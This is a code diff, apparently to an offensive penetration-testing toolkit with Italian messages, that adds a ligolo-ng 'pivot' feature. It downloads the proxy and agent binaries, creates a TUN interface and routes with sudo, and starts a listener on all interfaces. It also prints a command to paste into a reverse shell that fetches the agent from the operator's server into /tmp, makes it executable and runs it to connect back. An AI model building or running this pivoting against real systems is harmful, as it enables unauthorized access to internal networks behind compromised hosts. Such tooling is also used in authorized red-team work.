@@ -3878,3 +3878,322 @@ def tunnel_list() -> str:
         lines.append(f"    [{i}] target:{t['remote']} → \033[96mhttp://localhost:{t['local']}\033[0m")
     lines.append("")
     return "\n".join(lines)
+
+
+# ---------------------------------------------------------------------------
+# Pivot (ligolo-ng full IP tunneling)
+# ---------------------------------------------------------------------------
+
+LIGOLO_PROXY_BIN = STATIC_ROOT / "ligolo-proxy"
+LIGOLO_AGENT_BIN = STATIC_ROOT / "ligolo-agent"
+_LIGOLO_TUN = "ligolo"
+_LIGOLO_DEFAULT_PORT = 11601
+
+_ligolo_proc: subprocess.Popen | None = None
+_ligolo_port: int = 0
+_ligolo_routes: list[str] = []
+
+
+def _ligolo_latest_version() -> str:
+    try:
+        out = subprocess.run(
+            ["curl", "-sI", "https://github.com/nicocha30/ligolo-ng/releases/latest"],
+            capture_output=True, text=True, timeout=10,
+        )
+        for line in out.stdout.splitlines():
+            if line.lower().startswith("location:"):
+                return line.strip().rsplit("/", 1)[-1].lstrip("v")
+    except Exception:
+        pass
+    return "0.7.5"
+
+
+def pivot_fetch(force: bool = False) -> str:
+    STATIC_ROOT.mkdir(parents=True, exist_ok=True)
+
+    if LIGOLO_PROXY_BIN.exists() and LIGOLO_AGENT_BIN.exists() and not force:
+        ps = LIGOLO_PROXY_BIN.stat().st_size
+        ags = LIGOLO_AGENT_BIN.stat().st_size
+        return (f"ligolo-ng già presente in static/ "
+                f"(proxy {ps // 1024} KB, agent {ags // 1024} KB). "
+                f"Usa --force per riscaricare.")
+
+    ver = _ligolo_latest_version()
+    results: list[str] = []
+
+    for role, dest in [("proxy", LIGOLO_PROXY_BIN), ("agent", LIGOLO_AGENT_BIN)]:
+        tar_name = f"ligolo-ng_{role}_{ver}_linux_amd64.tar.gz"
+        tar_url = (f"https://github.com/nicocha30/ligolo-ng/releases/"
+                   f"download/v{ver}/{tar_name}")
+        tar_dest = STATIC_ROOT / tar_name
+
+        print(f"  Scaricamento ligolo-ng {role} v{ver}...")
+        if not _download_file(tar_url, tar_dest):
+            results.append(f"[-] Download di ligolo-ng {role} fallito.")
+            continue
+
+        import tarfile
+        tmp_bin = STATIC_ROOT / f"{dest.name}.tmp"
+        try:
+            with tarfile.open(tar_dest, "r:gz") as tf:
+                found = False
+                for member in tf.getmembers():
+                    basename = member.name.rsplit("/", 1)[-1]
+                    if basename in (role, f"ligolo-{role}", dest.name):
+                        member.name = tmp_bin.name
+                        tf.extract(member, STATIC_ROOT)
+                        found = True
+                        break
+                if not found:
+                    first = next((m for m in tf.getmembers() if not m.isdir()), None)
+                    if first:
+                        first.name = tmp_bin.name
+                        tf.extract(first, STATIC_ROOT)
+                        found = True
+                if not found:
+                    raise FileNotFoundError("binario non trovato nell'archivio")
+            tmp_bin.chmod(0o755)
+            if dest.exists():
+                dest.unlink()
+            os.replace(str(tmp_bin), str(dest))
+            tar_dest.unlink(missing_ok=True)
+            size = dest.stat().st_size
+            results.append(f"[+] ligolo-ng {role} v{ver} scaricato ({size // 1024} KB)")
+        except Exception as e:
+            tmp_bin.unlink(missing_ok=True)
+            tar_dest.unlink(missing_ok=True)
+            results.append(f"[-] Errore estrazione ligolo-ng {role}: {e}")
+
+    return "\n  ".join([""] + results)
+
+
+def _pivot_tun_exists() -> bool:
+    try:
+        out = subprocess.run(
+            ["ip", "link", "show", _LIGOLO_TUN],
+            capture_output=True, text=True, timeout=5,
+        )
+        return out.returncode == 0
+    except Exception:
+        return False
+
+
+def _pivot_setup_tun() -> str | None:
+    if _pivot_tun_exists():
+        return None
+    try:
+        subprocess.run(
+            ["sudo", "-n", "ip", "tuntap", "add", "user",
+             os.environ.get("USER", "root"), "mode", "tun", _LIGOLO_TUN],
+            capture_output=True, text=True, timeout=10, check=True,
+        )
+        subprocess.run(
+            ["sudo", "-n", "ip", "link", "set", _LIGOLO_TUN, "up"],
+            capture_output=True, text=True, timeout=10, check=True,
+        )
+        return None
+    except subprocess.CalledProcessError:
+        return ("[-] Impossibile creare l'interfaccia TUN.\n"
+                "    Esegui manualmente:\n\n"
+                f"    sudo ip tuntap add user $USER mode tun {_LIGOLO_TUN}\n"
+                f"    sudo ip link set {_LIGOLO_TUN} up")
+    except FileNotFoundError:
+        return "[-] Comando 'ip' non trovato."
+
+
+def _pivot_teardown_tun() -> None:
+    if not _pivot_tun_exists():
+        return
+    try:
+        subprocess.run(
+            ["sudo", "-n", "ip", "link", "del", _LIGOLO_TUN],
+            capture_output=True, timeout=10,
+        )
+    except Exception:
+        pass
+
+
+def pivot_start(port: int = _LIGOLO_DEFAULT_PORT,
+                lhost: str | None = None) -> str:
+    global _ligolo_proc, _ligolo_port
+
+    if lhost is None:
+        lhost = _lhost or get_default_ip()
+
+    if not LIGOLO_PROXY_BIN.exists():
+        return ("[-] ligolo-proxy non trovato in static/.\n"
+                "    Usa 'pivot fetch' per scaricarlo.")
+
+    if _ligolo_proc is not None and _ligolo_proc.poll() is None:
+        return (f"[-] Proxy già attivo (PID {_ligolo_proc.pid}, "
+                f"porta {_ligolo_port}).\n"
+                f"    Usa 'pivot stop' prima di riavviare.")
+
+    tun_err = _pivot_setup_tun()
+    if tun_err:
+        return tun_err
+
+    try:
+        _ligolo_proc = subprocess.Popen(
+            [str(LIGOLO_PROXY_BIN), "-selfcert",
+             "-laddr", f"0.0.0.0:{port}"],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            stdin=subprocess.DEVNULL,
+        )
+        _ligolo_port = port
+    except Exception as e:
+        return f"[-] Errore avvio ligolo-proxy: {e}"
+
+    serve_port = _server.server_address[1] if _server else 2727
+    base = f"http://{lhost}:{serve_port}"
+
+    lines = [
+        "",
+        f"  \033[92m[+] Interfaccia TUN '{_LIGOLO_TUN}' attiva\033[0m",
+        f"  \033[92m[+] ligolo-proxy in ascolto sulla porta {port}\033[0m",
+        "",
+        "  \033[1mIncolla nella revshell:\033[0m",
+        "",
+        f"  \033[96mcurl {base}/static/ligolo-agent -o /tmp/agent && "
+        f"chmod +x /tmp/agent && "
+        f"/tmp/agent -connect {lhost}:{port} -ignore-cert &\033[0m",
+        "",
+        "  \033[1mDopo la connessione dell'agent:\033[0m",
+        "",
+        f"  \033[96mpivot session\033[0m          — avvia il tunnel sulla sessione",
+        f"  \033[96mpivot route add \033[0m\033[96m<CIDR>\033[0m  — aggiungi rotta (es: 172.16.0.0/24)",
+        "",
+    ]
+    return "\n".join(lines)
+
+
+def pivot_stop() -> str:
+    global _ligolo_proc, _ligolo_port
+
+    if _ligolo_proc is None:
+        return "Nessun pivot attivo."
+
+    for cidr in list(_ligolo_routes):
+        _pivot_del_route(cidr)
+
+    try:
+        _ligolo_proc.terminate()
+        _ligolo_proc.wait(timeout=5)
+    except Exception:
+        try:
+            _ligolo_proc.kill()
+            _ligolo_proc.wait(timeout=3)
+        except Exception:
+            pass
+
+    import time
+    time.sleep(0.3)
+
+    _pivot_teardown_tun()
+    count = len(_ligolo_routes)
+    _ligolo_routes.clear()
+    _ligolo_proc = None
+    _ligolo_port = 0
+    return f"Pivot terminato. Proxy fermato, TUN rimossa, {count} rotte rimosse."
+
+
+def pivot_session() -> str:
+    if _ligolo_proc is None or _ligolo_proc.poll() is not None:
+        return "[-] Nessun proxy attivo. Usa 'pivot on' per avviare."
+
+    lhost = _lhost or get_default_ip()
+    return (f"\n  \033[92m[+] Proxy attivo\033[0m (PID {_ligolo_proc.pid}, "
+            f"porta {_ligolo_port})\n\n"
+            f"  Il proxy accetta connessioni automaticamente.\n"
+            f"  Per gestire le sessioni interattivamente:\n\n"
+            f"  \033[96m1.\033[0m Stoppa il proxy:  \033[96mpivot stop\033[0m\n"
+            f"  \033[96m2.\033[0m Avvialo a mano:   "
+            f"\033[96m./static/ligolo-proxy -selfcert -laddr 0.0.0.0:{_ligolo_port}\033[0m\n"
+            f"  \033[96m3.\033[0m Nella shell del proxy:  "
+            f"\033[96msession → 1 → start\033[0m\n\n"
+            f"  Oppure aggiungi direttamente le rotte con "
+            f"\033[96mpivot route add <CIDR>\033[0m\n")
+
+
+def _pivot_add_route(cidr: str) -> str | None:
+    try:
+        subprocess.run(
+            ["sudo", "-n", "ip", "route", "add", cidr, "dev", _LIGOLO_TUN],
+            capture_output=True, text=True, timeout=10, check=True,
+        )
+        return None
+    except subprocess.CalledProcessError as e:
+        stderr = e.stderr.strip() if e.stderr else ""
+        if "File exists" in stderr:
+            return f"Rotta {cidr} già presente."
+        return (f"[-] Impossibile aggiungere rotta.\n"
+                f"    Esegui manualmente:  sudo ip route add {cidr} dev {_LIGOLO_TUN}")
+    except FileNotFoundError:
+        return "[-] Comando 'ip' non trovato."
+
+
+def _pivot_del_route(cidr: str) -> str | None:
+    try:
+        subprocess.run(
+            ["sudo", "-n", "ip", "route", "del", cidr, "dev", _LIGOLO_TUN],
+            capture_output=True, text=True, timeout=10, check=True,
+        )
+        return None
+    except Exception:
+        return None
+
+
+def pivot_route_add(cidr: str) -> str:
+    if _ligolo_proc is None or _ligolo_proc.poll() is not None:
+        return "[-] Nessun pivot attivo. Usa 'pivot on' per avviare."
+    err = _pivot_add_route(cidr)
+    if err:
+        return err
+    if cidr not in _ligolo_routes:
+        _ligolo_routes.append(cidr)
+    return f"\033[92m[+]\033[0m Rotta aggiunta: {cidr} → dev {_LIGOLO_TUN}"
+
+
+def pivot_route_del(cidr: str) -> str:
+    err = _pivot_del_route(cidr)
+    if err:
+        return err
+    if cidr in _ligolo_routes:
+        _ligolo_routes.remove(cidr)
+    return f"Rotta rimossa: {cidr}"
+
+
+def pivot_route_list() -> str:
+    if not _ligolo_routes:
+        return "Nessuna rotta pivot configurata."
+    lines = [f"\n  \033[1mRotte pivot ({len(_ligolo_routes)}):\033[0m\n"]
+    for i, cidr in enumerate(_ligolo_routes, 1):
+        lines.append(f"    [{i}] {cidr} → dev {_LIGOLO_TUN}")
+    lines.append("")
+    return "\n".join(lines)
+
+
+def pivot_status() -> str:
+    if _ligolo_proc is None or _ligolo_proc.poll() is not None:
+        return "Nessun pivot attivo."
+    lines = [
+        f"\n  \033[92mligolo-proxy:\033[0m attivo "
+        f"(porta {_ligolo_port}, PID {_ligolo_proc.pid})",
+        f"  \033[92mTUN:\033[0m {_LIGOLO_TUN} "
+        f"({'up' if _pivot_tun_exists() else 'down'})",
+    ]
+    if _ligolo_routes:
+        lines.append(f"  \033[1mRotte attive:\033[0m {len(_ligolo_routes)}")
+        for i, cidr in enumerate(_ligolo_routes, 1):
+            lines.append(f"    [{i}] {cidr}")
+    else:
+        lines.append("  Nessuna rotta configurata.")
+
+    lhost = _lhost or get_default_ip()
+    lines.append("")
+    lines.append(f"  \033[1mComando agent:\033[0m")
+    lines.append(f"  \033[96m./agent -connect {lhost}:{_ligolo_port} "
+                 f"-ignore-cert &\033[0m")
+    lines.append("")
+    return "\n".join(lines)
